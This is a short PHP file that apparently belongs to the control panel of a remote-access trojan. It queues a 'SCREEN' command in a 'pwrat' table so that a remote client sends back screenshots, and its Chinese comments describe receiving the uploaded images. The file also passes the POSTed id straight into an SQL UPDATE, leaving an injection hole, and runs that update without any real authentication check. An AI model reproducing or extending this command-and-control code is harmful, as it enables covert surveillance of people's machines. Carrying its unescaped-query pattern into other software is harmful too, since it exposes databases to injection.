<?php
require("config.php");
$mysqli = new mysqli("localhost",$username,$password,"yourdbname");
if(mysqli_connect_error())
{
	printf("cant connect to the database：%s\n",mysqli_connect_error());
	exit();
}

//将截屏命令插入数据库
if($_POST["id"]!=NULL)
{
	$id = $_POST["id"];
	$mysqli->query("UPDATE pwrat SET cmd='SCREEN' WHERE id='$id'");
}

//获得上传来的图片

if (isset($_SESSION["admin"]))
{
	echo '<div id="console"><form action="files.php" method="post">
	id:&nbsp<input type="number" name="id" />
	<input type="submit" value="Get Screen Shot">
	</form></div>';
}


//如果图片存在则输出


$mysqli->close();
?>